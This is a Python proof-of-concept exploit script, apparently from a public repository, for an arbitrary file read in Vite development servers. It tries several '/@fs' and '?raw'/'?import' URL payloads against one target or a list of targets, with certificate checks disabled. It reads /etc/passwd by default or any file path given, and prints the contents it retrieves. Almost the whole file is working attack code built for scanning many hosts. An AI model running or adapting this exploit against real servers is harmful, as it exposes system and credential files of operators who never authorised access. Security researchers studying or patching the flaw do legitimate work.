# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-ViteExploit\vitexp.py
#!/usr/bin/env python3

import argparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"


def print_banner():
    print(f"""
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸ”¥ Vite Arbitrary File Read Exploit (PoC)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 Author : ynsmroztas
 GitHub : https://github.com/ynsmroztas
   X.com : https://x.com/ynsmroztas
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    """)


def color_code(code):
    return f"{GREEN}{code}{RESET}" if code == 200 else f"{RED}{code}{RESET}"


def poc(target, file_path="/etc/passwd"):
    payloads = [
        f"/@fs{file_path}?raw",
        f"/@fs{file_path}?import&raw",
        f"{file_path}?raw",
        f"{file_path}?import&raw",
        f"/@fs{file_path}?raw&import",
        f"/@fs{file_path}?raw?import=1",
    ]

    for path in payloads:
        url = target.rstrip("/") + path
        try:
            r = requests.get(url, timeout=6, verify=False)
            status = color_code(r.status_code)
            if r.status_code == 200 and "root:" in r.text:
                print(f"\n{GREEN}[+] VULNERABLE: {url}{RESET}")
                print(r.text[:1000])
                return
            else:
                print(f"[-] {status} - {url}")
        except requests.exceptions.SSLError as e:
            print(f"{RED}[!] SSL Error on {url} -> {e}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error on {url} -> {e}{RESET}")

    print(f"{RED}[!] Not vulnerable: {target}{RESET}")


if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="Vite Dev Server Arbitrary File Read PoC (MITSEC)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target base URL (e.g., https://target:5173)")
    group.add_argument("-l", "--list", help="File with list of target URLs (one per line)")
    parser.add_argument(
        "-f",
        "--file",
        default="/etc/passwd",
        help="File path to read (default: /etc/passwd)",
    )
    args = parser.parse_args()

    if args.url:
        poc(args.url, args.file)
    elif args.list:
        with open(args.list, "r") as f:
            for line in f:
                url = line.strip()
                if url:
                    print(f"\n[>] Testing: {url}")
                    poc(url, args.file)
